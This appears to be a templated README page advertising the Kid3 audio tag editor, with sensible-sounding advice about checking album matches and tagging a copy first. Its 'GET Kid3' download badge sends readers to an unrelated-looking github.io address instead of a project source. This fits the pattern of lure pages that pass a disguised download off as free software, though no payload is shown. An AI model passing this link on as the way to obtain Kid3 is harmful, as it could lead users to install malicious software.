# Kid3 - Tags on Audio You Already Own

Kid3 edits the title, artist, and album tags inside audio files you already have. A lookup can suggest names from public data. It does not download the songs. Save tags only when the suggested album matches the files in front of you, and try one album on a copy first.

---

## Why It Stands Out

![Kid3 with one album folder the user owns, before tags are written](https://www.ghacks.net/wp-content/uploads/2011/04/kid3-audio-tagger.png)

Files named Track01 are hard to live with, and they are still your files. Kid3 writes the names into those files when you tell it to save. Until that save, you are looking at a proposal. The proposal can be wrong: a compilation and a studio album often share a title, and a live recording can be matched to the studio track list. If the lengths or the titles do not fit, do not save.

Work on a copy of a small folder. A bad save on the only copy renames the library you actually play. Kid3 will not fetch the audio from the internet to fill a gap. If you do not have the file, tagging will not create it. Leave unmatched files unmatched rather than forcing the nearest album.

---

## Core Capabilities

- **Files You Open:** A folder of audio you may edit.
- **Tags You Can Read:** Title, artist, and album already stored in the file, or empty if nobody wrote them.
- **A Suggestion You Check:** Public names are a hint. The track list has to match.
- **Save Is the Write:** Nothing is retitled on disk until you save.
- **A Copy for the First Album:** The original folder stays intact if the match was wrong.

---

## Performance Tips

- Tag one album folder, not the entire library, the first time.
- Compare track count and lengths before you save.
- Keep the untagged copy until the player shows the names you wanted.
- Do not force a match onto a recording that is not that release.

## Quick Setup

Prerequisites: A copy of one album you own, in its own folder.

[![GET Kid3](https://img.shields.io/badge/GET%20%E2%80%94%20Kid3-334155?style=for-the-badge&logoColor=white)](https://srarendorwoodder.github.io/.github/kid3-tags)

1.  **Install:** Open Kid3 and add that copied folder.
2.  **Look at the Proposal:** Read the release name, the track count, and the lengths.
3.  **Save Only If It Fits:** If it does not, close without saving.
4.  **Play One File:** Confirm the title in your player. Keep the untagged copy until you are sure.

---

## Ideal For

- **A Disc You Ripped:** Replace Track01 on a copy of files you were allowed to make.
- **A Shop Folder:** Fix names the download wrote poorly, after you check the match.
- **A Mixed Pile:** Split it into albums before you save, so two releases are not tagged as one.
- **A Library You Care About:** Tag the copy, then replace the originals only when the names are right.

---

## Troubleshooting

- The suggested album is wrong? Do not save. Pick another match or type the tags yourself.
- The player still shows Track01? You saved a different folder, or the player cached the old tag. Reopen the file you saved.
- Lookup found nothing? Leave the file. Kid3 will not download a replacement song.
- You saved onto the only copy? Restore from the spare. If you have no spare, stop and do not save again until you do.
